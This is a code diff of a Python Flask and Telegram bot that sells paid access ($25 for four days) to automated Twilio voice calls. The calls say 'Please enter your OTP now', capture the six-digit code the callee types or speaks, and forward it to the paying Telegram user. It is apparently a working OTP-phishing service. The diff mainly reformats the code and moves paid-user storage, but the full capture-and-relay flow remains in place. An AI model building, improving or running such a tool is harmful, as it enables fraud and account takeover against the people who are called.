@@ -3,10 +3,11 @@ import os
 import asyncio
 import threading
 import logging
-import json
 from datetime import datetime, timedelta, timezone
 from urllib.parse import quote
+import json
 
+import requests
 from flask import Flask, request, Response
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -28,44 +29,46 @@ RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL")
 PUBLIC_BASE_URL = os.environ.get("NGROK_URL") or RENDER_EXTERNAL_URL
 
 TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN") or "YOUR_TELEGRAM_TOKEN"
+
 TWILIO_ACCOUNT_SID = os.environ.get("TWILIO_ACCOUNT_SID") or "YOUR_TWILIO_SID"
-TWILIO_AUTH_TOKEN = os.environ.get("TWILIO_AUTH_TOKEN") or "YOUR_TWILIO_AUTH"
-TWILIO_PHONE_NUMBER = os.environ.get("TWILIO_PHONE_NUMBER") or "+10000000000"
+TWILIO_AUTH_TOKEN = os.environ.get("TWILIO_AUTH_TOKEN") or "YOUR_TWILIO_AUTH_TOKEN"
+TWILIO_PHONE_NUMBER = os.environ.get("TWILIO_PHONE_NUMBER") or "+1234567890"
 twilio_client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)
 
 STRIPE_SECRET_KEY = os.environ.get("STRIPE_SECRET_KEY") or "YOUR_STRIPE_SK"
 stripe.api_key = STRIPE_SECRET_KEY
 
 if not PUBLIC_BASE_URL:
-    log.warning("PUBLIC_BASE_URL is not set. Set RENDER_EXTERNAL_URL in Render (or NGROK_URL locally).")
-
-# -------------------------
-# Paid users persistence
-# -------------------------
-PAID_USERS_FILE = "paid_users.json"
-
-def load_paid_users():
-    if os.path.exists(PAID_USERS_FILE):
-        with open(PAID_USERS_FILE, "r") as f:
-            data = json.load(f)
-            return {int(uid): datetime.fromisoformat(exp) for uid, exp in data.items()}
-    # Seeded user
-    return {6910149689: datetime.now(timezone.utc) + timedelta(days=4)}
-
-def save_paid_users():
-    data = {str(uid): exp.isoformat() for uid, exp in paid_users.items()}
-    with open(PAID_USERS_FILE, "w") as f:
-        json.dump(data, f, indent=2)
-
-paid_users = load_paid_users()
+    log.warning("PUBLIC_BASE_URL is not set. Set RENDER_EXTERNAL_URL or NGROK_URL.")
 
 # -------------------------
 # State storage
 # -------------------------
-user_phone = {}          # Telegram user -> phone number
-phone_to_chat = {}       # phone -> Telegram chat ID
-captured_otp = {}        # phone -> OTP
-last_message = {}        # Telegram user -> last custom message
+user_phone = {}
+phone_to_chat = {}
+captured_otp = {}
+last_message = {}
+PAID_USERS_FILE = "paid_users.json"
+
+# Load paid users from JSON
+def load_paid_users():
+    global paid_users
+    try:
+        with open(PAID_USERS_FILE, "r") as f:
+            data = json.load(f)
+        paid_users = {int(k): datetime.fromisoformat(v) for k, v in data.items()}
+        log.info("Loaded paid users from JSON")
+    except FileNotFoundError:
+        log.warning("paid_users.json not found. Starting with default seeded user.")
+        # Seeded user
+        paid_users = {6910149689: datetime.now(timezone.utc) + timedelta(days=4)}
+        save_paid_users()
+
+def save_paid_users():
+    with open(PAID_USERS_FILE, "w") as f:
+        json.dump({str(k): v.isoformat() for k, v in paid_users.items()}, f, indent=2)
+
+load_paid_users()
 
 # -------------------------
 # Helpers
@@ -105,7 +108,7 @@ def create_checkout_session(user_id: int, customer_email: str | None = None) -> 
     return session.url
 
 # -------------------------
-# Telegram Bot (async)
+# Telegram Bot
 # -------------------------
 application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
 
@@ -143,48 +146,29 @@ async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if query.data == "pay":
         try:
             checkout_url = create_checkout_session(user_id=uid)
-            await context.bot.send_message(
-                chat_id=update.effective_chat.id,
-                text=f"💳 Complete payment here: {checkout_url}"
-            )
+            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"💳 Complete payment here: {checkout_url}")
         except Exception as e:
-            await context.bot.send_message(
-                chat_id=update.effective_chat.id,
-                text=f"❌ Could not start checkout: {e}"
-            )
+            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Could not start checkout: {e}")
         return
 
     if query.data in ["setphone", "call"] and not is_paid(uid):
-        await context.bot.send_message(
-            chat_id=update.effective_chat.id,
-            text="💰 You must pay $25 for 4 days to use this feature."
-        )
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="💰 You must pay $25 for 4 days to use this feature.")
         return
 
     if query.data == "setphone":
         keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back to Menu", callback_data="menu")]])
-        await query.edit_message_text(
-            "📱 Please send me your phone number in the format: `+1XXXXXXXXXX`",
-            parse_mode="Markdown",
-            reply_markup=keyboard
-        )
+        await query.edit_message_text("📱 Please send me your phone number in the format: `+1XXXXXXXXXX`", parse_mode="Markdown", reply_markup=keyboard)
         context.user_data["awaiting_phone"] = True
 
     elif query.data == "call":
         if uid not in user_phone:
-            await query.edit_message_text(
-                "⚠️ Please set your phone first with 📱 Set Phone.",
-                reply_markup=get_main_keyboard(uid)
-            )
+            await query.edit_message_text("⚠️ Please set your phone first with 📱 Set Phone.", reply_markup=get_main_keyboard(uid))
         else:
             keyboard = InlineKeyboardMarkup([
                 [InlineKeyboardButton("↩️ Back to Menu", callback_data="menu")],
                 [InlineKeyboardButton("ℹ️ Info / Usage", callback_data="help")]
             ])
-            await query.edit_message_text(
-                "📞 Send me your custom message for the call.\n\nOr type `/call` to reuse your last message.",
-                reply_markup=keyboard
-            )
+            await query.edit_message_text("📞 Send me your custom message for the call.\n\nOr type `/call` to reuse your last message.", reply_markup=keyboard)
             context.user_data["awaiting_message"] = True
 
     elif query.data == "help":
@@ -210,10 +194,7 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("↩️ Back to Menu", callback_data="menu")],
             [InlineKeyboardButton("ℹ️ Info / Usage", callback_data="help")]
         ])
-        await update.message.reply_text(
-            f"✅ Phone number saved: {text}\nChoose an option below:",
-            reply_markup=keyboard
-        )
+        await update.message.reply_text(f"✅ Phone number saved: {text}\nChoose an option below:", reply_markup=keyboard)
         return
 
     if context.user_data.get("awaiting_message"):
@@ -257,8 +238,13 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         await update.message.reply_text(f"📞 Re-calling {phone} with your last message...")
 
+# Register handlers
+application.add_handler(CommandHandler("start", start))
+application.add_handler(CallbackQueryHandler(handle_buttons))
+application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
+
 # -------------------------
-# Flask app
+# Flask
 # -------------------------
 flask_app = Flask(__name__)
 
@@ -284,13 +270,8 @@ def telegram_webhook():
 def voice():
     message = request.args.get("msg", "Please enter your OTP now.")
     resp = VoiceResponse()
-    gather = Gather(
-        input="dtmf speech",
-        timeout=10,
-        num_digits=6,
-        action=f"{PUBLIC_BASE_URL}/capture",
-        method="POST"
-    )
+    gather = Gather(input="dtmf speech", timeout=10, num_digits=6,
+                    action=f"{PUBLIC_BASE_URL}/capture", method="POST")
     gather.say(message)
     gather.say("Now, please enter or speak your OTP.")
     resp.append(gather)
@@ -313,11 +294,12 @@ def capture():
                     bot_loop
                 )
                 fut.result(timeout=5)
-                # Show main menu after call ends
+                # Show menu after call
                 fut = asyncio.run_coroutine_threadsafe(
                     application.bot.send_message(chat_id=chat_id, text="Main Menu:", reply_markup=get_main_keyboard(uid)),
                     bot_loop
                 )
+                fut.result(timeout=5)
             except Exception:
                 log.exception("Failed to send OTP to Telegram")
 
@@ -342,10 +324,7 @@ def call_status():
         }
         msg = status_map.get(call_status_val, f"ℹ️ Call status: {call_status_val}")
         try:
-            fut = asyncio.run_coroutine_threadsafe(
-                application.bot.send_message(chat_id=chat_id, text=msg),
-                bot_loop
-            )
+            fut = asyncio.run_coroutine_threadsafe(application.bot.send_message(chat_id=chat_id, text=msg), bot_loop)
             fut.result(timeout=5)
             if call_status_val == "completed":
                 fut = asyncio.run_coroutine_threadsafe(
@@ -372,7 +351,7 @@ def payment_cancel():
     return "Payment canceled. You do not have access."
 
 # -------------------------
-# Bot loop thread + startup
+# Bot loop thread
 # -------------------------
 def bot_loop_thread():
     global bot_loop
